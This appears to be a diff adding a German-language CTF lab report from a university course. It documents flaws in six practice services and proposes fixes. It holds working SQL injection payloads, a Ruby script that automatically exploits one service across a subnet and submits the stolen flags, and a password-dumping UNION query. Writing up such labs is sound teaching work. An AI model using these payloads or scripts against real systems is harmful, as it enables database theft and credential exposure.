@@ -1,0 +1,344 @@
+﻿###############################################################################
+#                             Protokoll fuer CTF                              #
+###############################################################################
+
+Gruppe: 18:/Turnbeutelvergesser (S)                                              
+Informationen zum Protokoll: 
+Das Protokoll ist verpflichtend abzugeben. Das Protokoll dient als Grundlage
+fuer Ihre Bewertung fuer die Uebung der VU. 
+Beginnen Sie daher rechtzeitig mit dem Verfassen des Protokolls!
+
+Hinweise: 
+* Beschreiben Sie alle Fehler, welche Sie bei den Services gefunden haben. 
+* Erklaeren Sie auch wie Sie diese Fehler behoben haben.
+* Sollten Sie zwar Fehler finden, aber diese nicht beheben koennen, beschreiben 
+ Sie die gefundenen Stellen und was Sie machen muessten, um den Fehler zu 
+ beheben. 
+* Es koennen an unterschiedlichen Stellen Schwachstellen oder schlechte/falsche
+ Konfigurationen vorhanden sein. Wenn Sie diese finden, dokumentieren Sie 
+ diese, unabhaengig, ob diese ausnutzbar sind oder nicht.
+* Dokumentieren Sie kreative Ideen, um Angriffe/Abwehr/usw. durchzufuehren. Es 
+ ist wichtig, diese zu beschreiben, unabhaengig, ob Sie diese auch 
+ umgesetzt haben. 
+ z.B.: automatisierte Angriffe, Ausnutzen von Schwachstellen in Service A, um 
+       Flags von Service B zu erhalten, ...
+* Beschreiben Sie die durchgefuehrten Angriffe. Wenn ein Angriff nicht 
+ erfolgreich war, sollte dieser trotzdem dokumentiert werden. Es gibt
+ gegebenenfalls auch dafuer Punkte! Erklaeren Sie dann den versuchten Weg und
+ die aufgetretenen Fehler.
+* Wenn Sie zusaetzliche Dateien, wie zum Beispiel Source Code, Screenshots, usw
+ abgeben moechten, verweisen (Dateiname) Sie darauf in diesem Dokument und 
+ geben Sie diese zusammen mit dem Protokoll in einem Archiv (ZIP, Tar, usw.) 
+ ab.
+* Weitere Informationen zur Bewertung finden Sie auch in den CTF-Informationen
+ und Regeln in tuwel im Abschnitt zum CTF-Contest.
+
+
+
+
+
+
+
+
+
+###############################################################################
+# Team
+###############################################################################
+
+Teamname: /Turnbeutelvergesser
+
+-------------------------------------------------------------------------------
+Matrikelnummer, Vorname, Nachname
+-------------------------------------------------------------------------------
+Gubic Matthias (1226342)
+Neumeyer Markus (1225172)
+Gall Alexander (1225540)
+Grosslicht Patrick (1227085)
+Brichta Roy (0627867) - nicht anwesend
+-------------------------------------------------------------------------------
+
+###############################################################################
+# Service Newsletter
+###############################################################################
+
+-------------------------------------------------------------------------------
+1) Beschreibung des Services
+-------------------------------------------------------------------------------
+Ein kleines Newsletteradministrationsservice; man kann den Newsletter abonnieren unter Angabe seines Namen und seiner Emailadresse. Daraufhin bekommt man ein Passwort wodurch man seine “Mails” checken kann. Außerdem kann man “Mails” an alle abonnierten Leute verschicken.
+
+
+Programmiert in Java, Teile in ArnoldC. Port: 42424
+
+-------------------------------------------------------------------------------
+2) Gefundene Fehler und Loesungen
+-------------------------------------------------------------------------------
+Es existiert ein Masterpasswort, dessen Länge immer gleich ist und das nur aus Großbuchstaben besteht. Dadurch wäre es möglich, beliebige Mailaccounts zu lesen. 
+
+
+private String generateMasterPassword() {
+            StringBuilder sb = new StringBuilder();
+            Random random = new Random(0);
+            byte randoms[] = new byte[13];
+            random.nextBytes(randoms);
+            for (int i = 0; i < randoms.length; i++) {
+                    sb.append((char) ('A' + Math.abs(randoms[i] % 25)));
+            }
+            return sb.toString();
+    }
+Der einfachste Fix wäre einfach dieses Masterpasswort zu entfernen.
+
+-------------------------------------------------------------------------------
+3) Angriffe auf dieses Service
+-------------------------------------------------------------------------------
+Brutforce Angriff auf das Masterpasswort.
+Mithilfe der Methode wissen wir wie das Passwort aufgebaut ist, so kann man diese Information ausnutzen und selbst Passwörter Versuchsweise generieren und eingeben.
+
+
+###############################################################################
+# Service EsseCoin
+###############################################################################
+
+
+-------------------------------------------------------------------------------
+1) Beschreibung des Services
+-------------------------------------------------------------------------------
+“This service provides an interface to securely store your EsseCoins. You can specify the planned usage of the coin and a password to protect the EsseCoin.” 
+Nach dem Aufrufen des Services kommt man auf die Hauptseite in der 3 Links vorhanden sind: list, create, query
+Die Seite ermöglicht dem Benutzer das Speichern von EsseCoin’s.
+Diese Währung wird in einem Konto gespeichert und kann abgerufen werden.
+Auf der Seite list kann man alle Konten einsehen (Planned usage sowie Passwortlänge).
+Nach aufruf des Links create kann auf der folgenden Seite ein neues Konto angelegt werden. Dafür müssen die Felder Planned usage, Password sowie EsseCoin ausgefüllt werden. Auf der Seite query kann man dann mithilfe seines Verwendungszweckes und seinem Passwort seinen EsseCoin Status abgerufen werden.
+
+
+Dieser Service ist in Haskell geschrieben. Port: 8000
+
+
+-------------------------------------------------------------------------------
+2) Gefundene Fehler und Loesungen
+-------------------------------------------------------------------------------
+Schwache Authentifikation, Ausgabe der Passwortlänge.
+
+-------------------------------------------------------------------------------
+3) Angriffe auf dieses Service
+-------------------------------------------------------------------------------
+Ausnutzen der Schwachen Authentifikation.
+Man kann im Konto die Passwortlänge einsehen, daher besteht die Chance auf eine erfolgreiche Brutforce-Attacke.
+
+
+###############################################################################
+# Service CCValidation
+###############################################################################
+
+-------------------------------------------------------------------------------
+1) Beschreibung des Services
+-------------------------------------------------------------------------------
+Auf dieser Seite kann man Kreditkarten validieren lassen. Man gibt Kreditkartendaten ein und das Programm sagt, ob diese korrekt sind. Weiters kann man korrekte Kreditkarten in der Datenbank speichern. Wird eine korrekte Kreditkarte eingegeben, zeigt der Service die derzeitige IP sowie den letzten Zugriff und die Kreditkartendaten an.
+
+
+Dieser Service ist in PHP geschrieben. Port: 8118
+
+-------------------------------------------------------------------------------
+2) Gefundene Fehler und Loesungen
+-------------------------------------------------------------------------------
+SQL Injection über IP-GET-Parameter.
+
+
+if (!empty($_GET['ip'])) { // fallback
+            $ip = $_GET['ip'];
+    } else {
+                    $ip = $_SERVER['REMOTE_ADDR'];
+    }
+
+Dadurch wird zuerst der GET-Parameter verwendet, anstelle der echten IP-Adresse. Dieser Parameter wird dann nicht überprüft und direkt in Datenbankabfragen benutzt. 
+
+
+$res = $db->query("SELECT COUNT(*), address, lastaccess, description FROM ip WHERE address = '" . $address . "'");
+
+
+Diese Schwachstelle ist einfach zu fixen, indem man einfach den ganzen if-Block entfernt, und die IP nur auf $_SERVER['REMOTE_ADDR'] setzt.
+-------------------------------------------------------------------------------
+3) Angriffe auf dieses Service
+-------------------------------------------------------------------------------
+Wenn dem Server als IP-Parameter folgende Query übergeben wird, gibt er die Flag anstelle der IP aus:
+' UNION all select 1, owner, 1, 1 from cards where id=(SELECT max(id) from cards) limit 1,1;
+Automatisierung zu finden in ccvalidation.rb
+
+ccvalidation.rb
+--------------
+#!/usr/bin/ruby
+
+require 'curb'
+require 'date'
+
+def getFlag(ip)
+    c = Curl::Easy.new("http://#{ip}:8118/view/validate.php?ip=none%27%20UNION%20all%20select%201%2C%20owner%2C%201%2C%201%20from%20cards%20where%20id%3D%28SELECT%20max%28id%29%20from%20cards%29%20limit%201%2C1%3B%0A%3B")
+    c.perform
+    if /[A-Z0-9]{32}/.match(c.body_str)
+        return /[A-Z0-9]{32}/.match(c.body_str)[0]
+    end
+        return false
+end
+
+def submitFlag(flag)
+    c = Curl::Easy.new("http://10.10.40.200/SubmitFlagServlet?teamInput=18&flagInput=#{flag}")
+    #c.http_auth_types = :basic
+    #c.username = 'ctf'
+    #c.password = 'password'
+    c.perform
+    puts /Status:.*/x.match(c.body_str)
+end
+
+def rot(value)
+    value.tr! "A-Za-z", "N-ZA-Mn-za-m";
+end
+
+def checkFlag(flag)
+    return false if flag.size != 32
+    return false if flag[14..17] == "TEST"
+    date = DateTime.strptime(flag[0..13], "%d%m%Y%H%M%S")
+    return false if date < DateTime.now
+    return true
+end
+
+while true do
+    puts DateTime.now
+(10..30).each do |ip|
+    puts "Attacking 10.10.40.#{ip}"
+    flag = getFlag("10.10.40.#{ip}")
+    if flag
+        puts "Got flag, submitting"
+        submitFlag(flag) 
+    end
+end
+sleep(30)
+end
+---------------------
+
+###############################################################################
+# Service keepmesecret
+###############################################################################
+
+-------------------------------------------------------------------------------
+1) Beschreibung des Services
+-------------------------------------------------------------------------------
+Ein einfacher Service, der eine kurze Notiz (weniger als 1000 Zeichen) verschlüsselt speichern kann. Es können Zeichen eingegeben und (verschlüsselt) gespeichert werden, weiters kann der gespeicherte Text gelöscht werden. Mit dem Help Button wird eine Hilfeseite angezeigt.
+
+Dieser Service ist in PHP geschrieben. Port: 1337
+
+-------------------------------------------------------------------------------
+2) Gefundene Fehler und Loesungen
+-------------------------------------------------------------------------------
+php/session.inc.php
+25:    $fnam = DATASTORE_LOC."/".$_COOKIE["s"];
+
+
+php/store.inc.php
+13:    if($fp = @fopen($fnam, "w"))
+
+
+Hier wird ein Wert direkt aus dem Cookie als Dateiname benutzt. Dadurch könnte man beliebige Dateien auf dem Server lesen.
+
+
+Fix: serverseitige Session, Validierung des Pfades
+
+
+-------------------------------------------------------------------------------
+3) Angriffe auf dieses Service
+-------------------------------------------------------------------------------
+Es wurde versucht mittels Burp Suite durch HTTP-Request-Modification den Wert des Cookies zu verändern.
+
+
+Die Ausgabe des HTTP-Request:
+GET /home.php HTTP/1.1
+Host: 10.10.40.30:1337
+User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: de,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://10.10.40.30:1337/
+Cookie: session=eyJ1c2VyX2lkIjoiYWRtaW4ifQ.CFhY_g.L4RQ9twd8lUMyV5MjfLcd5UKZd4; s=6118eb0000748e22fe; k=ZFEds4a115Evdk3ydvXMGBoMohHxVB%2FrTIvBWNhxg1Q%3D
+Connection: keep-alive
+
+
+Hier sieht man die sessions und die cookies.
+
+
+###############################################################################
+# Service Shoppinglist
+###############################################################################
+
+-------------------------------------------------------------------------------
+1) Beschreibung des Services
+-------------------------------------------------------------------------------
+Ein einfacher Einkaufslistenservice. Man kann sich registrieren und hat dann nach dem login eine Textbox, in die man Sachen eingeben kann, welche dann persistiert werden.
+Man kann auch auf den Link user klicken um sich alle registrierten User ausgeben zu lassen.
+
+Dieser Service ist in PHP geschrieben. Port: 45895
+
+-------------------------------------------------------------------------------
+2) Gefundene Fehler und Loesungen
+-------------------------------------------------------------------------------
+Mögliche Object Injection [1] da unvalidierter Input einfach serialized bzw. unserialized wird. 
+Möglicher Fix: json_encode/decode verwenden.
+
+-------------------------------------------------------------------------------
+3) Angriffe auf dieses Service
+-------------------------------------------------------------------------------
+Es wurde versucht durch Code-Injection in der URL mittels verschiedener Befehle an die Einkaufslisten anderer User zu kommen.
+
+
+###############################################################################
+# Service Forum
+###############################################################################
+
+-------------------------------------------------------------------------------
+1) Beschreibung des Services
+-------------------------------------------------------------------------------
+Einfaches Forum in welchen man sich mit Username und Passwort Registrieren kann.
+Nach erfolgreichen Login kann man das Forum betreten. Dieses ist aber nicht fertig implementiert weshalb man keine Einträge machen kann.
+Es gibt 3 Links. Forum, user’s details und Search users.
+In user’s details kann man seine login-Daten einsehen. In Search users kann nach Usern in einer Datenbank gesucht werden.
+
+Dieser Service ist in Python geschrieben. Port: 3211
+
+-------------------------------------------------------------------------------
+2) Gefundene Fehler und Loesungen
+-------------------------------------------------------------------------------
+Der Suchparameter wird nicht validiert, daher ist eine SQL-Injection möglich. 
+query = g.db.execute("SELECT name FROM user WHERE name LIKE '%"
+                                 + search + "%'")
+search wird hier direkt vom User bereitgestellt.
+
+
+Fix:
+query = g.db.execute("SELECT name FROM user WHERE name LIKE ?", ('%'+search+'%',))
+wodurch search automatisch validiert wird
+
+-------------------------------------------------------------------------------
+3) Angriffe auf dieses Service
+-------------------------------------------------------------------------------
+Wenn man sich mit irgendwelchen Benutzerdaten registriert und danach eingeloggt hat, kann man einen Exploit in der User Suche ausnutzen (Search users).
+Mit der Eingabe von 
+%' UNION SELECT password FROM user -- 
+werden alle User und ihre Passwörter ausgegeben.[2] Darunter auch die Flags, die dann durch die Caesar Verschlüsselung noch entschlüsselt werden müssen. Ab dann steht dem automatisierten Angriff nichts mehr im Wege.
+Für die Automatisierung muss nur die Ausgegebene Liste nach den Flags durchsucht werden und die noch nicht veralteten (Datum im Flag!) sowie schon abgesendeten Flags aussortiert werden.
+
+
+######################################################################
+# Sonstige Anmerkungen
+#
+# Saemtliche Anmerkungen im Zusammenhang mit dem CTF. Dieser Teil wird nicht
+# fuer die Bewertung verwendet. Feedback hilft uns diese Veranstaltung fuer
+# kommende Semester zu verbessern.
+# 
+######################################################################
+
+
+
+######################################################################
+# Referenzen
+#
+# Referenzen auf verwendete Sourcen wie Tutorials, Web Seiten, ...
+######################################################################
+[1] https://www.owasp.org/index.php/PHP_Object_Injection
+[2] http://www.w3schools.com/sql/sql_injection.asp
